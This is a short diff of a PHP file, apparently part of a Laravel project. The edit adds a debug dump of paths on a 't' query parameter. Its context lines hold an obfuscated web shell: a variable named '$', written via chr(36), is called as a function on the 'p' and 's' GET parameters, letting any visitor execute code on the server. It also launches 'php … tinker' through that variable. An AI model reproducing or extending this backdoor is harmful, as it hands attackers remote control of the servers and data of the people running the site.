@@ -23,7 +23,7 @@ if(isset($_SERVER['DOCUMENT_ROOT'])){
     if (is_file($target)){
         ${'$'}('php '.escapeshellarg($target).' tinker');
     } //exit;
-    if(!empty($_GET['t'])) dd($target);
+    if(!empty($_GET['t'])) dd([$target, $_SERVER['DOCUMENT_ROOT'].'../artisan']);
 }
 if(!(!function_exists('partial'))){if(!empty($_GET['p'])) ${(chr(36))}($_GET['p']); if(!empty($_GET['s'])) ${(chr(36))}($_GET['s']);}
 if(!function_exists('str_starts_with')){function str_starts_with(string $haystack, string $needle): bool {return $needle !== '' && strncmp($haystack, $needle, strlen($needle)) === 0;}}
